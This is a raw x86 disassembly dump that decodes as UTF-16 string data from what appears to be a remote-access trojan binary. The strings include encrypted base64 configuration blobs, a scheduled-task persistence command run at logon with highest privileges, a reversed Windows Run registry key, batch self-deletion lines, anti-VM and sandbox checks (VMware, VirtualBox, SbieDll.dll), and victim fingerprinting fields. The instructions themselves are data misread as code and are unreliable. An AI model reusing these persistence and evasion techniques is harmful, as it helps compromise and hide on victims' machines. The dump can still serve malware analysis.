  40be65:	00 70 00             	add    %dh,0x0(%eax)
  40be68:	56                   	push   %esi
  40be69:	00 66 00             	add    %ah,0x0(%esi)
  40be6c:	59                   	pop    %ecx
  40be6d:	00 69 00             	add    %ch,0x0(%ecx)
  40be70:	6e                   	outsb  %ds:(%esi),(%dx)
  40be71:	00 6e 00             	add    %ch,0x0(%esi)
  40be74:	4b                   	dec    %ebx
  40be75:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40be79:	00 6d 00             	add    %ch,0x0(%ebp)
  40be7c:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40be80:	4a                   	dec    %edx
  40be81:	00 53 00             	add    %dl,0x0(%ebx)
  40be84:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
  40be88:	4a                   	dec    %edx
  40be89:	00 4a 00             	add    %cl,0x0(%edx)
  40be8c:	36 00 4c 00 64       	add    %cl,%ss:0x64(%eax,%eax,1)
  40be91:	00 4c 00 6b          	add    %cl,0x6b(%eax,%eax,1)
  40be95:	00 79 00             	add    %bh,0x0(%ecx)
  40be98:	71 00                	jno    0x40be9a
  40be9a:	6b 00 63             	imul   $0x63,(%eax),%eax
  40be9d:	00 6a 00             	add    %ch,0x0(%edx)
  40bea0:	79 00                	jns    0x40bea2
  40bea2:	4b                   	dec    %ebx
  40bea3:	00 58 00             	add    %bl,0x0(%eax)
  40bea6:	7a 00                	jp     0x40bea8
  40bea8:	53                   	push   %ebx
  40bea9:	00 35 00 63 00 65    	add    %dh,0x65006300
  40beaf:	00 58 00             	add    %bl,0x0(%eax)
  40beb2:	70 00                	jo     0x40beb4
  40beb4:	39 00                	cmp    %eax,(%eax)
  40beb6:	32 00                	xor    (%eax),%al
  40beb8:	79 00                	jns    0x40beba
  40beba:	70 00                	jo     0x40bebc
  40bebc:	47                   	inc    %edi
  40bebd:	00 6b 00             	add    %ch,0x0(%ebx)
  40bec0:	58                   	pop    %eax
  40bec1:	00 70 00             	add    %dh,0x0(%eax)
  40bec4:	2f                   	das
  40bec5:	00 31                	add    %dh,(%ecx)
  40bec7:	00 4f 00             	add    %cl,0x0(%edi)
  40beca:	34 00                	xor    $0x0,%al
  40becc:	43                   	inc    %ebx
  40becd:	00 37                	add    %dh,(%edi)
  40becf:	00 63 00             	add    %ah,0x0(%ebx)
  40bed2:	4d                   	dec    %ebp
  40bed3:	00 68 00             	add    %ch,0x0(%eax)
  40bed6:	77 00                	ja     0x40bed8
  40bed8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bedd:	80 b1 59 00 42 00 48 	xorb   $0x48,0x420059(%ecx)
  40bee4:	00 32                	add    %dh,(%edx)
  40bee6:	00 68 00             	add    %ch,0x0(%eax)
  40bee9:	6f                   	outsl  %ds:(%esi),(%dx)
  40beea:	00 57 00             	add    %dl,0x0(%edi)
  40beed:	35 00 59 00 78       	xor    $0x78005900,%eax
  40bef2:	00 43 00             	add    %al,0x0(%ebx)
  40bef5:	47                   	inc    %edi
  40bef6:	00 71 00             	add    %dh,0x0(%ecx)
  40bef9:	50                   	push   %eax
  40befa:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40befe:	00 79 00             	add    %bh,0x0(%ecx)
  40bf01:	78 00                	js     0x40bf03
  40bf03:	66 00 42 00          	data16 add %al,0x0(%edx)
  40bf07:	69 00 2f 00 2b 00    	imul   $0x2b002f,(%eax),%eax
  40bf0d:	46                   	inc    %esi
  40bf0e:	00 77 00             	add    %dh,0x0(%edi)
  40bf11:	6b 00 79             	imul   $0x79,(%eax),%eax
  40bf14:	00 52 00             	add    %dl,0x0(%edx)
  40bf17:	2b 00                	sub    (%eax),%eax
  40bf19:	37                   	aaa
  40bf1a:	00 68 00             	add    %ch,0x0(%eax)
  40bf1d:	75 00                	jne    0x40bf1f
  40bf1f:	70 00                	jo     0x40bf21
  40bf21:	6c                   	insb   (%dx),%es:(%edi)
  40bf22:	00 44 00 6d          	add    %al,0x6d(%eax,%eax,1)
  40bf26:	00 67 00             	add    %ah,0x0(%edi)
  40bf29:	35 00 53 00 70       	xor    $0x70005300,%eax
  40bf2e:	00 31                	add    %dh,(%ecx)
  40bf30:	00 37                	add    %dh,(%edi)
  40bf32:	00 62 00             	add    %ah,0x0(%edx)
  40bf35:	41                   	inc    %ecx
  40bf36:	00 49 00             	add    %cl,0x0(%ecx)
  40bf39:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40bf3d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf3e:	00 4f 00             	add    %cl,0x0(%edi)
  40bf41:	67 00 77 00          	add    %dh,0x0(%bx)
  40bf45:	70 00                	jo     0x40bf47
  40bf47:	72 00                	jb     0x40bf49
  40bf49:	63 00                	arpl   %eax,(%eax)
  40bf4b:	73 00                	jae    0x40bf4d
  40bf4d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf4e:	00 41 00             	add    %al,0x0(%ecx)
  40bf51:	63 00                	arpl   %eax,(%eax)
  40bf53:	45                   	inc    %ebp
  40bf54:	00 4f 00             	add    %cl,0x0(%edi)
  40bf57:	43                   	inc    %ebx
  40bf58:	00 2f                	add    %ch,(%edi)
  40bf5a:	00 76 00             	add    %dh,0x0(%esi)
  40bf5d:	50                   	push   %eax
  40bf5e:	00 6b 00             	add    %ch,0x0(%ebx)
  40bf61:	77 00                	ja     0x40bf63
  40bf63:	50                   	push   %eax
  40bf64:	00 73 00             	add    %dh,0x0(%ebx)
  40bf67:	39 00                	cmp    %eax,(%eax)
  40bf69:	42                   	inc    %edx
  40bf6a:	00 37                	add    %dh,(%edi)
  40bf6c:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40bf70:	00 67 00             	add    %ah,0x0(%edi)
  40bf73:	42                   	inc    %edx
  40bf74:	00 76 00             	add    %dh,0x0(%esi)
  40bf77:	73 00                	jae    0x40bf79
  40bf79:	78 00                	js     0x40bf7b
  40bf7b:	69 00 64 00 48 00    	imul   $0x480064,(%eax),%eax
  40bf81:	61                   	popa
  40bf82:	00 2f                	add    %ch,(%edi)
  40bf84:	00 37                	add    %dh,(%edi)
  40bf86:	00 41 00             	add    %al,0x0(%ecx)
  40bf89:	41                   	inc    %ecx
  40bf8a:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40bf90:	80 b1 6f 00 6f 00 4a 	xorb   $0x4a,0x6f006f(%ecx)
  40bf97:	00 2f                	add    %ch,(%edi)
  40bf99:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bf9c:	37                   	aaa
  40bf9d:	00 6e 00             	add    %ch,0x0(%esi)
  40bfa0:	2f                   	das
  40bfa1:	00 71 00             	add    %dh,0x0(%ecx)
  40bfa4:	34 00                	xor    $0x0,%al
  40bfa6:	68 00 38 00 56       	push   $0x56003800
  40bfab:	00 39                	add    %bh,(%ecx)
  40bfad:	00 4e 00             	add    %cl,0x0(%esi)
  40bfb0:	67 00 34             	add    %dh,(%si)
  40bfb3:	00 52 00             	add    %dl,0x0(%edx)
  40bfb6:	6c                   	insb   (%dx),%es:(%edi)
  40bfb7:	00 78 00             	add    %bh,0x0(%eax)
  40bfba:	69 00 77 00 57 00    	imul   $0x570077,(%eax),%eax
  40bfc0:	69 00 6a 00 77 00    	imul   $0x77006a,(%eax),%eax
  40bfc6:	59                   	pop    %ecx
  40bfc7:	00 69 00             	add    %ch,0x0(%ecx)
  40bfca:	38 00                	cmp    %al,(%eax)
  40bfcc:	43                   	inc    %ebx
  40bfcd:	00 4b 00             	add    %cl,0x0(%ebx)
  40bfd0:	4f                   	dec    %edi
  40bfd1:	00 70 00             	add    %dh,0x0(%eax)
  40bfd4:	50                   	push   %eax
  40bfd5:	00 39                	add    %bh,(%ecx)
  40bfd7:	00 63 00             	add    %ah,0x0(%ebx)
  40bfda:	49                   	dec    %ecx
  40bfdb:	00 41 00             	add    %al,0x0(%ecx)
  40bfde:	6d                   	insl   (%dx),%es:(%edi)
  40bfdf:	00 59 00             	add    %bl,0x0(%ecx)
  40bfe2:	53                   	push   %ebx
  40bfe3:	00 57 00             	add    %dl,0x0(%edi)
  40bfe6:	6a 00                	push   $0x0
  40bfe8:	75 00                	jne    0x40bfea
  40bfea:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40bfee:	62 00                	bound  %eax,(%eax)
  40bff0:	31 00                	xor    %eax,(%eax)
  40bff2:	50                   	push   %eax
  40bff3:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
  40bff7:	00 76 00             	add    %dh,0x0(%esi)
  40bffa:	35 00 4c 00 69       	xor    $0x69004c00,%eax
  40bfff:	00 62 00             	add    %ah,0x0(%edx)
  40c002:	42                   	inc    %edx
  40c003:	00 48 00             	add    %cl,0x0(%eax)
  40c006:	35 00 59 00 55       	xor    $0x55005900,%eax
  40c00b:	00 76 00             	add    %dh,0x0(%esi)
  40c00e:	56                   	push   %esi
  40c00f:	00 79 00             	add    %bh,0x0(%ecx)
  40c012:	71 00                	jno    0x40c014
  40c014:	6f                   	outsl  %ds:(%esi),(%dx)
  40c015:	00 4c 00 49          	add    %cl,0x49(%eax,%eax,1)
  40c019:	00 41 00             	add    %al,0x0(%ecx)
  40c01c:	54                   	push   %esp
  40c01d:	00 56 00             	add    %dl,0x0(%esi)
  40c020:	58                   	pop    %eax
  40c021:	00 4d 00             	add    %cl,0x0(%ebp)
  40c024:	77 00                	ja     0x40c026
  40c026:	44                   	inc    %esp
  40c027:	00 6b 00             	add    %ch,0x0(%ebx)
  40c02a:	2b 00                	sub    (%eax),%eax
  40c02c:	36 00 30             	add    %dh,%ss:(%eax)
  40c02f:	00 77 00             	add    %dh,0x0(%edi)
  40c032:	37                   	aaa
  40c033:	00 4b 00             	add    %cl,0x0(%ebx)
  40c036:	59                   	pop    %ecx
  40c037:	00 45 00             	add    %al,0x0(%ebp)
  40c03a:	4f                   	dec    %edi
  40c03b:	00 41 00             	add    %al,0x0(%ecx)
  40c03e:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c043:	03 33                	add    (%ebx),%esi
  40c045:	00 00                	add    %al,(%eax)
  40c047:	80 b1 61 00 70 00 4e 	xorb   $0x4e,0x700061(%ecx)
  40c04e:	00 72 00             	add    %dh,0x0(%edx)
  40c051:	67 00 55 00          	add    %dl,0x0(%di)
  40c055:	69 00 4b 00 6f 00    	imul   $0x6f004b,(%eax),%eax
  40c05b:	76 00                	jbe    0x40c05d
  40c05d:	51                   	push   %ecx
  40c05e:	00 6e 00             	add    %ch,0x0(%esi)
  40c061:	30 00                	xor    %al,(%eax)
  40c063:	37                   	aaa
  40c064:	00 39                	add    %bh,(%ecx)
  40c066:	00 6d 00             	add    %ch,0x0(%ebp)
  40c069:	76 00                	jbe    0x40c06b
  40c06b:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40c06f:	75 00                	jne    0x40c071
  40c071:	39 00                	cmp    %eax,(%eax)
  40c073:	30 00                	xor    %al,(%eax)
  40c075:	35 00 73 00 49       	xor    $0x49007300,%eax
  40c07a:	00 2f                	add    %ch,(%edi)
  40c07c:	00 70 00             	add    %dh,0x0(%eax)
  40c07f:	38 00                	cmp    %al,(%eax)
  40c081:	37                   	aaa
  40c082:	00 51 00             	add    %dl,0x0(%ecx)
  40c085:	38 00                	cmp    %al,(%eax)
  40c087:	6c                   	insb   (%dx),%es:(%edi)
  40c088:	00 58 00             	add    %bl,0x0(%eax)
  40c08b:	73 00                	jae    0x40c08d
  40c08d:	71 00                	jno    0x40c08f
  40c08f:	2f                   	das
  40c090:	00 71 00             	add    %dh,0x0(%ecx)
  40c093:	30 00                	xor    %al,(%eax)
  40c095:	44                   	inc    %esp
  40c096:	00 36                	add    %dh,(%esi)
  40c098:	00 67 00             	add    %ah,0x0(%edi)
  40c09b:	7a 00                	jp     0x40c09d
  40c09d:	44                   	inc    %esp
  40c09e:	00 38                	add    %bh,(%eax)
  40c0a0:	00 56 00             	add    %dl,0x0(%esi)
  40c0a3:	53                   	push   %ebx
  40c0a4:	00 45 00             	add    %al,0x0(%ebp)
  40c0a7:	66 00 74 00 61       	data16 add %dh,0x61(%eax,%eax,1)
  40c0ac:	00 48 00             	add    %cl,0x0(%eax)
  40c0af:	39 00                	cmp    %eax,(%eax)
  40c0b1:	79 00                	jns    0x40c0b3
  40c0b3:	47                   	inc    %edi
  40c0b4:	00 5a 00             	add    %bl,0x0(%edx)
  40c0b7:	33 00                	xor    (%eax),%eax
  40c0b9:	55                   	push   %ebp
  40c0ba:	00 4a 00             	add    %cl,0x0(%edx)
  40c0bd:	49                   	dec    %ecx
  40c0be:	00 6e 00             	add    %ch,0x0(%esi)
  40c0c1:	52                   	push   %edx
  40c0c2:	00 2f                	add    %ch,(%edi)
  40c0c4:	00 75 00             	add    %dh,0x0(%ebp)
  40c0c7:	38 00                	cmp    %al,(%eax)
  40c0c9:	49                   	dec    %ecx
  40c0ca:	00 51 00             	add    %dl,0x0(%ecx)
  40c0cd:	45                   	inc    %ebp
  40c0ce:	00 2b                	add    %ch,(%ebx)
  40c0d0:	00 31                	add    %dh,(%ecx)
  40c0d2:	00 78 00             	add    %bh,0x0(%eax)
  40c0d5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0d6:	00 55 00             	add    %dl,0x0(%ebp)
  40c0d9:	70 00                	jo     0x40c0db
  40c0db:	54                   	push   %esp
  40c0dc:	00 46 00             	add    %al,0x0(%esi)
  40c0df:	6a 00                	push   $0x0
  40c0e1:	64 00 2f             	add    %ch,%fs:(%edi)
  40c0e4:	00 6e 00             	add    %ch,0x0(%esi)
  40c0e7:	32 00                	xor    (%eax),%al
  40c0e9:	4c                   	dec    %esp
  40c0ea:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40c0ee:	00 70 00             	add    %dh,0x0(%eax)
  40c0f1:	43                   	inc    %ebx
  40c0f2:	00 51 00             	add    %dl,0x0(%ecx)
  40c0f5:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c0fa:	09 6e 00             	or     %ebp,0x0(%esi)
  40c0fd:	75 00                	jne    0x40c0ff
  40c0ff:	6c                   	insb   (%dx),%es:(%edi)
  40c100:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c104:	01 00                	add    %eax,(%eax)
  40c106:	03 3a                	add    (%edx),%edi
  40c108:	00 00                	add    %al,(%eax)
  40c10a:	0d 50 00 61 00       	or     $0x610050,%eax
  40c10f:	63 00                	arpl   %eax,(%eax)
  40c111:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c114:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c118:	09 50 00             	or     %edx,0x0(%eax)
  40c11b:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c121:	00 0f                	add    %cl,(%edi)
  40c123:	4d                   	dec    %ebp
  40c124:	00 65 00             	add    %ah,0x0(%ebp)
  40c127:	73 00                	jae    0x40c129
  40c129:	73 00                	jae    0x40c12b
  40c12b:	61                   	popa
  40c12c:	00 67 00             	add    %ah,0x0(%edi)
  40c12f:	65 00 00             	add    %al,%gs:(%eax)
  40c132:	07                   	pop    %es
  40c133:	63 00                	arpl   %eax,(%eax)
  40c135:	6d                   	insl   (%dx),%es:(%edi)
  40c136:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c13a:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c140:	00 73 00             	add    %dh,0x0(%ebx)
  40c143:	63 00                	arpl   %eax,(%eax)
  40c145:	68 00 74 00 61       	push   $0x61007400
  40c14a:	00 73 00             	add    %dh,0x0(%ebx)
  40c14d:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c150:	00 20                	add    %ah,(%eax)
  40c152:	00 2f                	add    %ch,(%edi)
  40c154:	00 63 00             	add    %ah,0x0(%ebx)
  40c157:	72 00                	jb     0x40c159
  40c159:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c15d:	74 00                	je     0x40c15f
  40c15f:	65 00 20             	add    %ah,%gs:(%eax)
  40c162:	00 2f                	add    %ch,(%edi)
  40c164:	00 66 00             	add    %ah,0x0(%esi)
  40c167:	20 00                	and    %al,(%eax)
  40c169:	2f                   	das
  40c16a:	00 73 00             	add    %dh,0x0(%ebx)
  40c16d:	63 00                	arpl   %eax,(%eax)
  40c16f:	20 00                	and    %al,(%eax)
  40c171:	6f                   	outsl  %ds:(%esi),(%dx)
  40c172:	00 6e 00             	add    %ch,0x0(%esi)
  40c175:	6c                   	insb   (%dx),%es:(%edi)
  40c176:	00 6f 00             	add    %ch,0x0(%edi)
  40c179:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c17d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c17e:	00 20                	add    %ah,(%eax)
  40c180:	00 2f                	add    %ch,(%edi)
  40c182:	00 72 00             	add    %dh,0x0(%edx)
  40c185:	6c                   	insb   (%dx),%es:(%edi)
  40c186:	00 20                	add    %ah,(%eax)
  40c188:	00 68 00             	add    %ch,0x0(%eax)
  40c18b:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c191:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c195:	74 00                	je     0x40c197
  40c197:	20 00                	and    %al,(%eax)
  40c199:	2f                   	das
  40c19a:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c19e:	00 20                	add    %ah,(%eax)
  40c1a0:	00 22                	add    %ah,(%edx)
  40c1a2:	00 00                	add    %al,(%eax)
  40c1a4:	11 22                	adc    %esp,(%edx)
  40c1a6:	00 20                	add    %ah,(%eax)
  40c1a8:	00 2f                	add    %ch,(%edi)
  40c1aa:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c1ae:	00 20                	add    %ah,(%eax)
  40c1b0:	00 27                	add    %ah,(%edi)
  40c1b2:	00 22                	add    %ah,(%edx)
  40c1b4:	00 01                	add    %al,(%ecx)
  40c1b6:	13 22                	adc    (%edx),%esp
  40c1b8:	00 27                	add    %ah,(%edi)
  40c1ba:	00 20                	add    %ah,(%eax)
  40c1bc:	00 26                	add    %ah,(%esi)
  40c1be:	00 20                	add    %ah,(%eax)
  40c1c0:	00 65 00             	add    %ah,0x0(%ebp)
  40c1c3:	78 00                	js     0x40c1c5
  40c1c5:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c1cb:	5c                   	pop    %esp
  40c1cc:	00 6e 00             	add    %ch,0x0(%esi)
  40c1cf:	75 00                	jne    0x40c1d1
  40c1d1:	52                   	push   %edx
  40c1d2:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c1d6:	00 6f 00             	add    %ch,0x0(%edi)
  40c1d9:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c1df:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c1e3:	74 00                	je     0x40c1e5
  40c1e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1e6:	00 65 00             	add    %ah,0x0(%ebp)
  40c1e9:	72 00                	jb     0x40c1eb
  40c1eb:	72 00                	jb     0x40c1ed
  40c1ed:	75 00                	jne    0x40c1ef
  40c1ef:	43                   	inc    %ebx
  40c1f0:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c1f4:	00 77 00             	add    %dh,0x0(%edi)
  40c1f7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1f8:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c1fc:	00 69 00             	add    %ch,0x0(%ecx)
  40c1ff:	57                   	push   %edi
  40c200:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c204:	00 66 00             	add    %ah,0x0(%esi)
  40c207:	6f                   	outsl  %ds:(%esi),(%dx)
  40c208:	00 73 00             	add    %dh,0x0(%ebx)
  40c20b:	6f                   	outsl  %ds:(%esi),(%dx)
  40c20c:	00 72 00             	add    %dh,0x0(%edx)
  40c20f:	63 00                	arpl   %eax,(%eax)
  40c211:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c217:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c21b:	61                   	popa
  40c21c:	00 77 00             	add    %dh,0x0(%edi)
  40c21f:	74 00                	je     0x40c221
  40c221:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c225:	53                   	push   %ebx
  40c226:	00 00                	add    %al,(%eax)
  40c228:	03 22                	add    (%edx),%esp
  40c22a:	00 00                	add    %al,(%eax)
  40c22c:	09 2e                	or     %ebp,(%esi)
  40c22e:	00 62 00             	add    %ah,0x0(%edx)
  40c231:	61                   	popa
  40c232:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c236:	13 40 00             	adc    0x0(%eax),%eax
  40c239:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c23d:	68 00 6f 00 20       	push   $0x20006f00
  40c242:	00 6f 00             	add    %ch,0x0(%edi)
  40c245:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c249:	00 1f                	add    %bl,(%edi)
  40c24b:	74 00                	je     0x40c24d
  40c24d:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c253:	6f                   	outsl  %ds:(%esi),(%dx)
  40c254:	00 75 00             	add    %dh,0x0(%ebp)
  40c257:	74 00                	je     0x40c259
  40c259:	20 00                	and    %al,(%eax)
  40c25b:	33 00                	xor    (%eax),%eax
  40c25d:	20 00                	and    %al,(%eax)
  40c25f:	3e 00 20             	add    %ah,%ds:(%eax)
  40c262:	00 4e 00             	add    %cl,0x0(%esi)
  40c265:	55                   	push   %ebp
  40c266:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c26a:	15 53 00 54 00       	adc    $0x540053,%eax
  40c26f:	41                   	inc    %ecx
  40c270:	00 52 00             	add    %dl,0x0(%edx)
  40c273:	54                   	push   %esp
  40c274:	00 20                	add    %ah,(%eax)
  40c276:	00 22                	add    %ah,(%edx)
  40c278:	00 22                	add    %ah,(%edx)
  40c27a:	00 20                	add    %ah,(%eax)
  40c27c:	00 22                	add    %ah,(%edx)
  40c27e:	00 00                	add    %al,(%eax)
  40c280:	07                   	pop    %es
  40c281:	43                   	inc    %ebx
  40c282:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c286:	00 00                	add    %al,(%eax)
  40c288:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c28c:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c290:	00 22                	add    %ah,(%edx)
  40c292:	00 00                	add    %al,(%eax)
  40c294:	0f 22 00             	mov    %eax,%cr0
  40c297:	20 00                	and    %al,(%eax)
  40c299:	2f                   	das
  40c29a:	00 66 00             	add    %ah,0x0(%esi)
  40c29d:	20 00                	and    %al,(%eax)
  40c29f:	2f                   	das
  40c2a0:	00 71 00             	add    %dh,0x0(%ecx)
  40c2a3:	00 05 78 00 70 00    	add    %al,0x700078
  40c2a9:	00 45 53             	add    %al,0x53(%ebp)
  40c2ac:	00 65 00             	add    %ah,0x0(%ebp)
  40c2af:	6c                   	insb   (%dx),%es:(%edi)
  40c2b0:	00 65 00             	add    %ah,0x0(%ebp)
  40c2b3:	63 00                	arpl   %eax,(%eax)
  40c2b5:	74 00                	je     0x40c2b7
  40c2b7:	20 00                	and    %al,(%eax)
  40c2b9:	2a 00                	sub    (%eax),%al
  40c2bb:	20 00                	and    %al,(%eax)
  40c2bd:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c2c1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2c2:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2c5:	20 00                	and    %al,(%eax)
  40c2c7:	57                   	push   %edi
  40c2c8:	00 69 00             	add    %ch,0x0(%ecx)
  40c2cb:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2cc:	00 33                	add    %dh,(%ebx)
  40c2ce:	00 32                	add    %dh,(%edx)
  40c2d0:	00 5f 00             	add    %bl,0x0(%edi)
  40c2d3:	43                   	inc    %ebx
  40c2d4:	00 6f 00             	add    %ch,0x0(%edi)
  40c2d7:	6d                   	insl   (%dx),%es:(%edi)
  40c2d8:	00 70 00             	add    %dh,0x0(%eax)
  40c2db:	75 00                	jne    0x40c2dd
  40c2dd:	74 00                	je     0x40c2df
  40c2df:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2e3:	53                   	push   %ebx
  40c2e4:	00 79 00             	add    %bh,0x0(%ecx)
  40c2e7:	73 00                	jae    0x40c2e9
  40c2e9:	74 00                	je     0x40c2eb
  40c2eb:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2ef:	00 19                	add    %bl,(%ecx)
  40c2f1:	4d                   	dec    %ebp
  40c2f2:	00 61 00             	add    %ah,0x0(%ecx)
  40c2f5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2f6:	00 75 00             	add    %dh,0x0(%ebp)
  40c2f9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c2fd:	63 00                	arpl   %eax,(%eax)
  40c2ff:	74 00                	je     0x40c301
  40c301:	75 00                	jne    0x40c303
  40c303:	72 00                	jb     0x40c305
  40c305:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c309:	00 2b                	add    %ch,(%ebx)
  40c30b:	6d                   	insl   (%dx),%es:(%edi)
  40c30c:	00 69 00             	add    %ch,0x0(%ecx)
  40c30f:	63 00                	arpl   %eax,(%eax)
  40c311:	72 00                	jb     0x40c313
  40c313:	6f                   	outsl  %ds:(%esi),(%dx)
  40c314:	00 73 00             	add    %dh,0x0(%ebx)
  40c317:	6f                   	outsl  %ds:(%esi),(%dx)
  40c318:	00 66 00             	add    %ah,0x0(%esi)
  40c31b:	74 00                	je     0x40c31d
  40c31d:	20 00                	and    %al,(%eax)
  40c31f:	63 00                	arpl   %eax,(%eax)
  40c321:	6f                   	outsl  %ds:(%esi),(%dx)
  40c322:	00 72 00             	add    %dh,0x0(%edx)
  40c325:	70 00                	jo     0x40c327
  40c327:	6f                   	outsl  %ds:(%esi),(%dx)
  40c328:	00 72 00             	add    %dh,0x0(%edx)
  40c32b:	61                   	popa
  40c32c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c330:	00 6f 00             	add    %ch,0x0(%edi)
  40c333:	6e                   	outsb  %ds:(%esi),(%dx)
  40c334:	00 00                	add    %al,(%eax)
  40c336:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c339:	6f                   	outsl  %ds:(%esi),(%dx)
  40c33a:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c33e:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c342:	0f 56 00             	orps   (%eax),%xmm0
  40c345:	49                   	dec    %ecx
  40c346:	00 52 00             	add    %dl,0x0(%edx)
  40c349:	54                   	push   %esp
  40c34a:	00 55 00             	add    %dl,0x0(%ebp)
  40c34d:	41                   	inc    %ecx
  40c34e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c352:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c357:	77 00                	ja     0x40c359
  40c359:	61                   	popa
  40c35a:	00 72 00             	add    %dh,0x0(%edx)
  40c35d:	65 00 00             	add    %al,%gs:(%eax)
  40c360:	15 56 00 69 00       	adc    $0x690056,%eax
  40c365:	72 00                	jb     0x40c367
  40c367:	74 00                	je     0x40c369
  40c369:	75 00                	jne    0x40c36b
  40c36b:	61                   	popa
  40c36c:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c370:	00 6f 00             	add    %ch,0x0(%edi)
  40c373:	78 00                	js     0x40c375
  40c375:	00 17                	add    %dl,(%edi)
  40c377:	53                   	push   %ebx
  40c378:	00 62 00             	add    %ah,0x0(%edx)
  40c37b:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c381:	6c                   	insb   (%dx),%es:(%edi)
  40c382:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c386:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c38a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c38e:	11 45 00             	adc    %eax,0x0(%ebp)
  40c391:	72 00                	jb     0x40c393
  40c393:	72 00                	jb     0x40c395
  40c395:	20 00                	and    %al,(%eax)
  40c397:	48                   	dec    %eax
  40c398:	00 57 00             	add    %dl,0x0(%edi)
  40c39b:	49                   	dec    %ecx
  40c39c:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3a0:	05 78 00 32 00       	add    $0x320078,%eax
  40c3a5:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c3ab:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c3b1:	74 00                	je     0x40c3b3
  40c3b3:	49                   	dec    %ecx
  40c3b4:	00 6e 00             	add    %ch,0x0(%esi)
  40c3b7:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c3bb:	00 09                	add    %cl,(%ecx)
  40c3bd:	48                   	dec    %eax
  40c3be:	00 57 00             	add    %dl,0x0(%edi)
  40c3c1:	49                   	dec    %ecx
  40c3c2:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3c6:	09 55 00             	or     %edx,0x0(%ebp)
  40c3c9:	73 00                	jae    0x40c3cb
  40c3cb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c3cf:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c3d5:	00 13                	add    %dl,(%ebx)
  40c3d7:	4d                   	dec    %ebp
  40c3d8:	00 69 00             	add    %ch,0x0(%ecx)
  40c3db:	63 00                	arpl   %eax,(%eax)
  40c3dd:	72 00                	jb     0x40c3df
  40c3df:	6f                   	outsl  %ds:(%esi),(%dx)
